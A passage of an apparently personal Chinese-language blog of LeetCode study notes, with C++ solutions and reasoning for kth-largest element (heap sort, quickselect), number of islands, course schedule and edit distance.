<span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Test Case 6: Vector already sorted in descending order</span>    <span class="token punctuation">&#123;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">heapSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">testHeapSort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ol></li><li><p>快排是可以确定每一轮的pivot处于最终排序位置的，基于此寻找第k大;</p><ol type="1"><li><p>Code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">void</span> <span class="token function">quickSelectKth</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> pivot <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> left<span class="token punctuation">;</span>        <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> j <span class="token operator">=</span> left<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> right<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// j++ 之后的j = 上一行的j+1;出循环后保证了j是>=nums[pivot]的最小值</span>                j<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 交换后，保证了nums[j]是在0-j序列中的最小值，因此如果k&lt;j,则nums[k]>nums[j]</span>        <span class="token comment">// 因此往左侧搜寻</span>        <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// while循环结束，i=j,此时的位置就是pivot排序的最终位置，也就确认了pivot是第几大</span>        <span class="token comment">// 如果k=j,则已经达到目的</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">&lt;</span> j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">quickSelectKth</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> left<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">></span> j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">quickSelectKth</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> right<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">findKthLargest</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 注意第k大的数在数组中排序是k-1</span>        <span class="token function">quickSelectKth</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nums<span class="token punctuation">[</span>k<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li><li><p>逆天测试用例无法通过<imgsrc="https://s2.loli.net/2023/11/21/8iDzI9kldZjeJUQ.png"alt="image-20231121091543725" /></p></li></ol></li><li><p>最好的划分：3组</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">quickSearchKth</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> pivot <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> big<span class="token punctuation">,</span> equal<span class="token punctuation">,</span> small<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num <span class="token operator">:</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">></span> pivot<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                big<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> pivot<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                small<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                equal<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">&lt;=</span> big<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">quickSearchKth</span><span class="token punctuation">(</span>big<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> small<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 在全局中是第k大,而在samll中不是</span>            <span class="token keyword">return</span> <span class="token function">quickSearchKth</span><span class="token punctuation">(</span>small<span class="token punctuation">,</span> k <span class="token operator">-</span> big<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> equal<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> pivot<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">findKthLargest</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">quickSearchKth</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="岛屿数量">2023-11-15 <ahref="https://leetcode.cn/problems/number-of-islands/description/">200.岛屿数量</a></h3><h4 id="我思-6">我思</h4><ol type="1"><li>理解1座岛屿的<strong>概念</strong>：<ol type="1"><li>岛屿总是被水包围，</li><li>并且每座岛屿只能由<code>水平</code>方向和/或<code>竖直</code>方向上相邻的陆地连接形成<imgsrc="https://s2.loli.net/2023/11/15/CZ4SQAe9ROEtYoN.png"alt="image-20231115024938652" /></li></ol></li><li>识别到<code>1</code><code>（i,j）</code>，那么就检测它的周围（<code>[i-1,j]</code>,<code>[i+1,j]</code>,<code>[i,j-1]</code>,<code>[i,j+1]</code>；<strong>注意</strong>：考虑到边界原因，这些坐标并不一定都存在）是否为<code>1</code>，<ol type="1"><li>如果是<code>1</code>，那么就是同一座岛屿，并把它标记为<strong>已处理</strong><ol type="1"><li>1座岛屿面积确定的标志：所有<code>1</code>的上下左右均为<code>0</code>，否则加入新的<code>1</code>继续延伸</li></ol></li><li>如果为<code>0</code>，那么就是岛屿的一处边界</li></ol></li></ol><h4 id="实现-6">实现</h4><ol type="1"><li><p>Code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token comment">// dfs</span>    <span class="token comment">// 进行dfs的次数便是岛屿的个数</span>    <span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token operator">&amp;</span> grid<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 遍历到的1复位为0，避免重复处理</span>        grid<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'0'</span><span class="token punctuation">;</span>        <span class="token comment">// dfs 这个“1”的四周</span>        <span class="token keyword">int</span> rc <span class="token operator">=</span> grid<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> cc <span class="token operator">=</span> grid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> grid<span class="token punctuation">[</span>r <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'1'</span><span class="token punctuation">)</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>grid<span class="token punctuation">,</span> r <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> rc <span class="token operator">&amp;&amp;</span> grid<span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'1'</span><span class="token punctuation">)</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>grid<span class="token punctuation">,</span> r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> grid<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">[</span>c <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'1'</span><span class="token punctuation">)</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>grid<span class="token punctuation">,</span> r<span class="token punctuation">,</span> c <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> cc <span class="token operator">&amp;&amp;</span> grid<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">[</span>c <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'1'</span><span class="token punctuation">)</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>grid<span class="token punctuation">,</span> r<span class="token punctuation">,</span> c <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">numIslands</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token operator">&amp;</span> grid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> rc <span class="token operator">=</span> grid<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>rc<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> cc <span class="token operator">=</span> grid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> nums_islands <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> r <span class="token operator">&lt;</span> rc<span class="token punctuation">;</span> r<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> c <span class="token operator">&lt;</span> cc<span class="token punctuation">;</span> c<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>grid<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'1'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    nums_islands<span class="token operator">++</span><span class="token punctuation">;</span>                    <span class="token function">dfs</span><span class="token punctuation">(</span>grid<span class="token punctuation">,</span>r<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> nums_islands<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="课程表">2023-11-19: <ahref="https://leetcode.cn/problems/course-schedule/description/">207.课程表</a></h3><h4 id="我思-7">我思</h4><ol type="1"><li>示例是不是不够，应该还有很多情况没有列出来吧（但感觉也不太可能）</li></ol><h4 id="实现-7">实现</h4><ol type="1"><li><p>每个课程表示为图中的一个顶点及其每门课程之间的关系构成了一个图</p></li><li><p>给定一个有向无环图，<code>拓扑排序</code>是将图中的顶点按顺序排列，使得对于图中任意一条有向边，其起点顶点在其终点顶点之前。</p></li><li><p>如果会互相依赖，实际则表现为成环，则不可能完成课程的学习</p></li><li><p>说明：</p><ol type="1"><li><p>对于图中的任意一个节点，它在搜索的过程中有<strong>三种状态</strong>，即：</p><p>「<strong>未搜索</strong>」：我们还没有搜索到这个节点；</p><p>「<strong>搜索中</strong>」：我们搜索过这个节点，但还没有回溯到该节点，即该节点还没有入栈，还有相邻的节点没有搜索完成）；</p><p>「<strong>已完成</strong>」：我们搜索过并且回溯过这个节点，即该节点已经入栈，并且所有该节点的相邻节点都出现在栈的更底部的位置，满足拓扑排序的要求。</p></li></ol></li><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">private</span><span class="token operator">:</span>    vector<span class="token generics"><span class="token punctuation">&lt;</span>vector<span class="token punctuation">&lt;</span><span class="token keyword">int</span><span class="token punctuation">></span><span class="token punctuation">></span></span> edges<span class="token punctuation">;</span>    vector<span class="token generics"><span class="token punctuation">&lt;</span><span class="token keyword">int</span><span class="token punctuation">></span></span> visit<span class="token punctuation">;</span>    bool finished <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 标记为已被访问</span>        visit<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">// 访问u的邻接点</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> v <span class="token operator">:</span> edges<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 有环（即不能完成所有课程）</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>finished<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>visit<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 如果该邻接点未被访问过，则继续深度优先搜索</span>                <span class="token function">dfs</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>visit<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 如果该节点之前便处于搜索中，那么说明存在环</span>                finished <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 返回u,u及其邻接点搜索完成</span>        visit<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bool <span class="token function">canFinish</span><span class="token punctuation">(</span><span class="token keyword">int</span> numCourses<span class="token punctuation">,</span> vector<span class="token generics"><span class="token punctuation">&lt;</span>vector<span class="token punctuation">&lt;</span><span class="token keyword">int</span><span class="token punctuation">></span><span class="token punctuation">></span></span><span class="token operator">&amp;</span> prerequisites<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        edges<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>numCourses<span class="token punctuation">)</span><span class="token punctuation">;</span>        visit<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>numCourses<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> auto<span class="token operator">&amp;</span> info <span class="token operator">:</span> prerequisites<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            edges<span class="token punctuation">[</span>info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> numCourses <span class="token operator">&amp;&amp;</span> finished<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>visit<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> finished<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="编辑距离">2023-11-09：<ahref="https://leetcode.cn/problems/edit-distance/description/">72.编辑距离</a></h3><h4 id="我思-8">我思</h4><ol type="1"><li>充分利用相似的部分<ol type="1"><li>一样的字母</li><li>字母之间的相对顺序</li></ol></li><li>但是代码中如何实现以上特性呢<ol type="1"><li>操作的方式有3种，怎么确定这是最少的操作方式</li></ol></li></ol><h4 id="实现-8">实现</h4><ol type="1"><li><p>定义dp是一个难点</p></li><li><p>状态转移关系同样是个难点</p></li><li><p>Code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">minDistance</span><span class="token punctuation">(</span>string word1<span class="token punctuation">,</span> string word2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 动态规划</span>        <span class="token comment">// 定义 dp[i][j] : dp[i][j] 代表 word1 中前 i 个字符，变换到 word2 中前</span>        <span class="token comment">// j 个字符，最短需要操作的次数:需要考虑 word1 或 word2</span>        <span class="token comment">// 状态转移 :</span>        <span class="token comment">// 增，dp[i][j] = dp[i][j - 1] + 1</span>        <span class="token comment">// 删，dp[i][j] = dp[i - 1][j] + 1</span>        <span class="token comment">// 改，dp[i][j] = dp[i - 1][j - 1] + 1</span>        <span class="token comment">// 按顺序计算，当计算 dp[i][j] 时，dp[i - 1][j] ， dp[i][j - 1] ， dp[i</span>        <span class="token comment">// - 1][j - 1] 均已经确定了 配合增删改这三种操作，需要对应的 dp</span>        <span class="token comment">// 把操作次数加一，取三种的最小 如果刚好这两个字母相同 word1[i - 1] =</span>        <span class="token comment">// vector 的初始化方法为 vector(size,value)</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span>word1<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>                               <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>word2<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 一个字母都没有，即全增加/删除的情况，所以预留 dp[0][j] 和 dp[i][0]</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span>i<span class="token 